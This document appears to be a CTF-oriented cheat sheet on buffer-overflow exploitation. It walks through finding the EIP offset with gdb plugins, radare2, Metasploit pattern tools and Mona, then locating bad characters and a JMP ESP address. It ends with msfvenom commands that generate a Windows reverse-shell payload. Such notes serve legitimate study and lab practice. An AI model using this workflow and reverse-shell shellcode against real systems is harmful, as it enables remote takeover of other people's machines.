# Find EIP offset
## gdb
- search for input

```python
> run
input:
AAAAAAAAAAA

> search-pattern AAAAAAAAAAA
[+] Searching 'AAAAAAAA' in memory
[+] In '[heap]'(0x804d000-0x806f000), permission=rw-
 0x804d1a0 - 0x804d1aa → "AAAAAAAA\n" 
[+] In '[stack]'(0xfffdd000-0xffffe000), permission=rw-
 0xffffd00c - 0xffffd014 → "AAAAAAAA" 

>  i f
Stack level 0, frame at 0xffffd080:
 eip = 0x804935a in vuln; saved eip = 0x80493dd
 called by frame at 0xffffd0b0
 Arglist at 0xffffcfec, args: 
 Locals at 0xffffcfec, Previous frame's sp is 0xffffd080
 Saved registers:
 ebx at 0xffffd074, ebp at 0xffffd078, eip at 0xffffd07c

> python print(0xffffd07c - 0xffffd00c)
112
```

- cyclic pattern

```bash
## Create pattern
# Metasploit
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 150
# gdb-peda
gdb-peda$ pattern create 150  
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA'
# gdb-pwndbg
pwndbg> cyclic 150  
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma
# gdb-gef
gef➤ pattern create 150  
[+] Generating a pattern of 150 bytes (n=4)  
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma  
[+] Saved as '$_gef0'

## Feed the pattern to the binary within gdb
## Search EIP value to get offset
# Metasploit
/usr/share/metasploit-framework/tools/exploit/pattern_offset -q 0xdeadbeef
# gdb-peda
db-peda$ pattern offset 0x41414641  
1094796865 found at offset: 44
# gdb-pwndbg
pwndbg> cyclic -l 0x6161616c  
44
# gdb-gef
gef➤ pattern offset 0x6161616c  
[+] Searching for '0x6161616c'  
[+] Found at offset 44 (little-endian search) likely  
[+] Found at offset 41 (big-endian search)
```
## r2
- use metasploit cyclic pattern
```bash
$ r2 -d vuln   
glibc.fc_offset = 0x00148  
[0xf7f90070]> aaa  
[x] Analyze all flags starting with sym. and entry0 (aa)  
[x] Analyze function calls (aac)  
[x] Analyze len bytes of instructions for references (aar)  
[x] Finding and parsing C++ vtables (avrr)  
[x] Skipping type matching analysis in debugger mode (aaft)  
[x] Propagate noreturn information (aanr)  
[x] Use -AA or aaaa to perform additional experimental analysis.  
[0xf7f90070]> dc  
Please enter your string:    
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9  
Okay, time to return... Fingers Crossed... Jumping to 0x35624134  
[+] SIGNAL 11 errno=0 addr=0x35624134 code=1 si_pid=895631668 ret=0  
[0x35624134]> dr  
eax = 0x00000041  
ebx = 0x41326241  
ecx = 0x00000041  
edx = 0xffffffff  
esi = 0x00000001  
edi = 0x080490e0  
esp = 0xffc71be0  
ebp = 0x62413362  
eip = 0x35624134  
eflags = 0x00010282  
oeax = 0xffffffff
[0x35624134]> exit  
Do you want to quit? (Y/n) y  
Do you want to kill the process? (Y/n) y

## Search offset
$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x35624134  
[*] Exact match at offset 44
```
## cmdline

# Immunity Debugger + Mona
- Set Mona Working Folder
```
!mona config -set workingfolder c:\mona\%p
```
- Generate pattern
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
!mona pattern_create 3000
```
- After crash, note EIP value then identify the offset:
```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39654138
[*] Exact match at offset 2012
```
- Compare memory with bytearray to find bad chars
```
!mona bytearray
!mona compare -a esp -f c:\path\to\bytearray.bin
```
- Find JMP ESP Address
```
!mona jmp -r esp
```
- Generate shellcode
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=0.0.0.0 LPORT=4444 -f c -b "\x00"
msfvenom -p windows/shell_reverse_tcp LHOST=0.0.0.0 LPORT=4444 -b "\x00" -f python EXITFUNC=thread
```
- Generate byte string
```python
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

## Links
___
### Guides

### Writeups
- https://cd6629.gitbook.io/ctfwriteups/buffer-overflow-wlk/brainstorm-w
- https://noxious.tech/posts/Brainstorm/